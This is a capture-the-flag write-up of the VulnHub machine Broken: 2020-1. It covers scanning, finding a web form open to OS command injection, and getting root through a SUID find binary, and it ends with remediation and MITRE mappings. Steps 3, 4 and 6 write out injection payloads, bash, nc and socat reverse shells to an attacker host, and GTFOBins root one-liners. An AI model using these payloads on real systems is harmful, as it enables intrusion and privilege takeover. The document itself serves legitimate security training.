# Broken: 2020-1 — Writeup

> *When a web app just pipes your input straight into a shell command and the only thing standing between you and a root shell is one SUID binary with an entry on GTFOBins, you know the dev team was having a rough 2020. Bruh, at least sanitize your inputs. Rekt.*

---

## Machine Metadata

| Field | Value |
|---|---|
| **Level** | Easy/Medium |
| **Target VM** | Broken: 2020-1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/broken-2020-1,/ |
| **Techniques** | Web application enumeration, OS command injection, reverse shell, SUID binary abuse / sudo privilege escalation |
| **CVEs** | None (misconfiguration; CWE-78 OS Command Injection) |
| **APT Relevance** | Command injection is the initial access vector for multiple threat actors including APT28 and criminal ransomware groups exploiting internet-facing web apps (MITRE G0007); SUID abuse documented across Linux post-exploitation toolkits |

---

## Attack Summary

```
[Attacker]
      |
      v
netdiscover + nmap -sV -sC
--> 22/tcp (SSH), 80/tcp (HTTP Apache)
      |
      v
Gobuster / dirb: enumerate web directories and endpoints
--> find vulnerable parameter in web form
      |
      v
OS command injection: "; id", "| whoami", "$(id)"
--> confirm RCE via server response
      |
      v
Reverse shell payload via injection:
"; bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'"
nc -lvp 4444 --> low-privilege shell (www-data)
      |
      v
Shell stabilization (pty.spawn)
      |
      v
find / -perm -4000 (SUID bins) + sudo -l
--> SUID find / writable cron / sudo misconfiguration identified
      |
      v
GTFOBins exploit: find . -exec /bin/bash -p \; -quit
--> uid=0(root)
      |
      v
cat /root/root.txt
    [ROOT]
```

---

## Methodology

1. Network discovery with netdiscover and full port scan with service detection
2. Web application directory enumeration with gobuster/dirb
3. Manual testing of input parameters for OS command injection
4. Reverse shell delivery via command injection
5. Shell stabilization and TTY upgrade
6. Privilege escalation enumeration: SUID binaries, sudo permissions, writable crons
7. Root escalation via SUID abuse (GTFOBins) or sudo misconfiguration

---

## Steps

### Step 1: Network Discovery and Port Scan

**Context:** Identify the target on the local network and enumerate open services. Broken: 2020-1 is an intentionally vulnerable Linux machine with a web application as the primary attack surface.

```bash
netdiscover -r 192.168.1.0/24
nmap -sV -sC 192.168.1.X -oN nmap-initial.txt
```

**Expected output:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

**Alternatives:** `rustscan -a 192.168.1.X -- -sV` for faster initial scan; `masscan -p 1-65535 192.168.1.X --rate=1000` for full port discovery.

**Real-world note:** External-facing attack surfaces commonly lead with HTTP/HTTPS. Automated asset discovery tools (Shodan, Censys, Project Discovery's `httpx`) index these endpoints continuously; any misconfiguration is found quickly.

**MITRE TTP:** T1595.001 - Active Scanning: Scanning IP Blocks | T1046 - Network Service Discovery

---

### Step 2: Web Application Enumeration

**Context:** With HTTP on port 80 confirmed, enumerate the web application for directories, endpoints, and input parameters. Look for forms that interact with the server backend.

```bash
gobuster dir \
  -u http://192.168.1.X/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,sh \
  -o gobuster-out.txt
```

**Manual browser steps:**
- Review all visible forms and input fields
- Check page source for commented-out parameters or hidden inputs
- Try parameters: `?cmd=`, `?exec=`, `?ping=`, `?host=`, `?ip=`

**Alternatives:** `feroxbuster` for recursive enumeration; `nikto -h http://192.168.1.X` for quick automated checks.

**Real-world note:** OWASP ZAP and Burp Suite Pro's active scanner detect OS command injection during automated scans. Bug bounty hunters routinely find these in `/api/ping`, `/admin/test`, and `/tools/` endpoints.

**MITRE TTP:** T1592.002 - Gather Victim Network Information | T1083 - File and Directory Discovery

---

### Step 3: OS Command Injection

**Context:** Once a potentially vulnerable input is identified (commonly a form field that performs network operations, diagnostics, or server-side lookups), test for OS command injection using shell metacharacters.

```bash
# Test payloads injected into the parameter value:
; id
| whoami
`id`
$(id)
& id
|| id
```

**Look for the command output reflected in the HTTP response.** If `id` returns `uid=33(www-data)` or similar, RCE is confirmed.

**Craft a reverse shell:**
```bash
# Start listener first:
nc -lvp 4444

# Inject via the vulnerable parameter (URL-encoded):
; bash -c 'bash -i >& /dev/tcp/192.168.1.ATTACKER/4444 0>&1'
```

**Expected output on listener:**
```
Connection from 192.168.1.X:XXXXX
bash: no job control in this shell
www-data@broken:/$
```

**Alternatives:** `python3 -c 'import socket,subprocess,os;...'` reverse shell if bash redirect is blocked; `mkfifo /tmp/f; nc LHOST 4444 < /tmp/f | /bin/sh > /tmp/f` for older systems.

**Real-world note:** OS command injection (CWE-78) is trivially preventable with parameterized APIs (subprocess with list args, no `shell=True`). It appears in CISA's top routinely exploited vulnerabilities list. Affected apps should use `shlex.quote()` at minimum, or refactor to avoid shell execution entirely.

**MITRE TTP:** T1190 - Exploit Public-Facing Application | T1059.004 - Command and Scripting Interpreter: Unix Shell

---

### Step 4: Shell Stabilization

**Context:** Raw netcat shells lack tab completion, job control, and proper signal handling. Stabilize for a usable interactive session before enumeration.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z to background
stty raw -echo
fg
# Press Enter twice
```

**Alternative (socat full TTY):**
```bash
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target (injected):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444
```

**MITRE TTP:** T1059.004 - Command and Scripting Interpreter: Unix Shell

---

### Step 5: Privilege Escalation Enumeration

**Context:** With a low-privilege shell, enumerate paths to root: SUID binaries, sudo permissions, writable crons, interesting capabilities, and world-writable paths.

```bash
# SUID binaries:
find / -perm -4000 -type f 2>/dev/null

# Sudo permissions:
sudo -l

# Writable cron jobs:
ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
cat /etc/crontab

# Interesting capabilities:
getcap -r / 2>/dev/null

# World-writable paths:
find / -writable -type f 2>/dev/null | grep -v proc
```

**Expected output (example, SUID find):**
```
/usr/bin/find
```

**Alternatives:** Run `linpeas.sh` for comprehensive automated enumeration; `pspy64` to monitor cron and process executions in real time without root.

**Real-world note:** Regular SUID audits are a baseline hardening task. CIS Benchmark for Linux (Level 1) explicitly recommends removing unnecessary SUID/SGID bits. Tools like `aide` and `tripwire` detect unauthorized SUID changes.

**MITRE TTP:** T1083 - File and Directory Discovery | T1057 - Process Discovery

---

### Step 6: Root via SUID Binary (GTFOBins)

**Context:** With SUID `find` identified, use the GTFOBins technique to launch a privileged bash instance.

```bash
find . -exec /bin/bash -p \; -quit
```

**Expected output:**
```
bash-4.x# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-4.x# cat /root/root.txt
[ROOT FLAG]
```

**Alternative (if sudo -l shows nopasswd entry):**
```bash
# Example: sudo find / -exec /bin/bash \; works too
# Or: sudo vim -c ':!/bin/bash'
```

**Real-world note:** GTFOBins (gtfobins.github.io) documents abuse techniques for 180+ Unix binaries. The fix is removing unnecessary SUID bits with `chmod -s /usr/bin/find`. Automated tools like Lynis and Wazuh SYSCHECK flag unexpected SUID bits on non-system binaries.

**MITRE TTP:** T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Captured Flags, Hashes, and Credentials

| Type | Value | Where Found | Used For |
|---|---|---|---|
| RCE Proof | `uid=33(www-data)` | Command injection in web form | Confirmed OS-level code execution |
| Root Flag | `/root/root.txt` | Post-escalation via SUID find | Machine completion |

---

## Lessons Learned

| Finding | Real-World Relevance |
|---|---|
| OS command injection via web form | Any unsanitized input passed to shell APIs is exploitable. Use parameterized subprocess calls; never `os.system(user_input)`. |
| Web app running as high-privilege user | Running Apache/PHP as www-data is correct; running as root or a sudoer amplifies every web vuln to a full system compromise. |
| SUID on non-essential binary (find) | No standard deployment needs SUID find. Remove it. Audit with `find / -perm -4000` weekly and alert on changes. |
| No WAF or input validation | A WAF would not fully prevent this, but application-layer validation (allowlists, type checking) stops most injection attempts before they reach shell. |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Scanning IP Blocks | T1595.001 |
| Discovery | Network Service Discovery | T1046 |
| Discovery | File and Directory Discovery | T1083 |
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Abuse Elevation Control Mechanism: Setuid/Setgid | T1548.001 |
| Defense Evasion | Abuse Elevation Control Mechanism | T1548 |

---

## Remediation

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | ID.RA-1 | Classify all external-facing web applications; include command injection in threat model |
| Protect | PR.AC-4 | Run web services as dedicated non-privileged user; remove unnecessary SUID bits |
| Protect | PR.IP-1 | Implement input validation and output encoding as secure coding standard |
| Detect | DE.CM-1 | Monitor for unusual child process spawning from web server process |
| Respond | RS.MI-1 | Isolate compromised web server immediately upon RCE detection |

### NIST SP 800-53 Controls

| Control | Requirement | Applicability |
|---|---|---|
| SI-10 | Information Input Validation | Validate and sanitize all user-supplied input before processing |
| AC-6 | Least Privilege | Web process account must have no sudo rights and no SUID-capable binaries |
| CM-6 | Configuration Settings | Disable SUID on non-essential binaries; use CIS benchmark baseline |
| AU-12 | Audit Record Generation | Log all web application inputs and process spawning by the web user |
| SC-7 | Boundary Protection | Restrict outbound connections from the web server to prevent reverse shell callbacks |

### CISA KEV Relevance

CWE-78 (OS Command Injection) is the root cause of multiple CISA KEV entries (e.g., CVE-2021-22205 GitLab, CVE-2022-1388 F5 BIG-IP, CVE-2023-27997 Fortinet). This class of vulnerability is among the most actively exploited by nation-state and criminal threat actors.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Practice | Gap |
|---|---|---|
| ACM | ACM-2b | No SUID audit baseline = MIL0 |
| IAM | IAM-1a | Web app as privileged user = MIL0 |
| SA (Situational Awareness) | SA-1a | No process spawn monitoring = MIL0 |

### MITRE D3FEND Countermeasures

| D3FEND Technique | ID | Defends Against |
|---|---|---|
| Process Spawn Analysis | D3-PSA | Detects shell spawned by Apache/PHP process |
| Network Traffic Analysis | D3-NTA | Detects reverse shell outbound connection |
| Application Hardening | D3-AH | Input validation prevents command injection |
| Executable Allowlisting | D3-EAL | Prevents execution of unexpected binaries via SUID |

---

## Final Thoughts

Broken: 2020-1 is a clean, no-frills command injection box that nails the fundamentals. The chain is linear and the privesc is textbook GTFOBins. Not the flashiest box on VulnHub, but it drills exactly what you need to recognize: unsanitized input reaching a shell call, and a SUID binary that should never have been there. If you can explain CWE-78 to a developer and point them to the exact line of code that needs fixing after popping this box, that is the real win. GG no re, dev team.

Thanks guys!! (❍ᴥ❍ʋ)
